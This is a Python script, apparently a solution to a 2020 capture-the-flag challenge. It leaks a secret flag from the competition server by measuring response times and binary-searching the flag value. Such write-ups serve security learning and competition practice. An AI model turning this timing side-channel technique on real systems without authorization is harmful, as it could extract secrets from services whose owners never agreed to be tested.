#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright: Oran Avraham <contact@oranav.me>
import socket
from time import time


def encode(val: int):
    return val.to_bytes(16, 'big')


def is_bigger_than(val):
    assert 0 <= val < 2**(16*8)
    s = socket.socket()
    s.connect(('tracing.2020.ctfcompetition.com', 1337))
    s.send(encode(val))
    for i in range(2**9):
        s.send(encode(val+i))
    s.shutdown(socket.SHUT_WR)
    s.recv(4)
    start = time()
    s.recv(1)
    end = time()
    s.close()
    return end - start >= 0.01


prefix = b'CTF{'
start = int.from_bytes(prefix + (b'\0' * (16 - len(prefix))), 'big')
end = int.from_bytes(prefix + (b'\xff' * (16 - len(prefix))), 'big')

while end > start:
    check = (start + end) // 2
    print(check.to_bytes(16, 'big'))
    if is_bigger_than(check):
        start = check + 1
    else:
        end = check
